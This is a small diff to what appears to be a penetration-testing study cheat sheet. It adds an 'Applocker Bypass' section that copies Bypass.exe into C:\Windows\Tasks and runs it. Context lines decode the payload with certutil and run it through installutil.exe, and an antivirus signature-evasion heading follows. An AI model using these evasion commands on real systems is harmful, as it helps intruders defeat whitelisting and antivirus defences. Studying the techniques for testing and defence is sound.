@@ -44,7 +44,12 @@ certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe
 del C:\users\student\enc.txt
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
 ```
-
+# Applocker Bypass
+## Copy to unprotected directories
+```
+copy Bypass.exe C:\Windows\Tasks
+C:\Windows\Tasks\Bypass.exe 
+```
 # AV
 ## Find signature
 ```
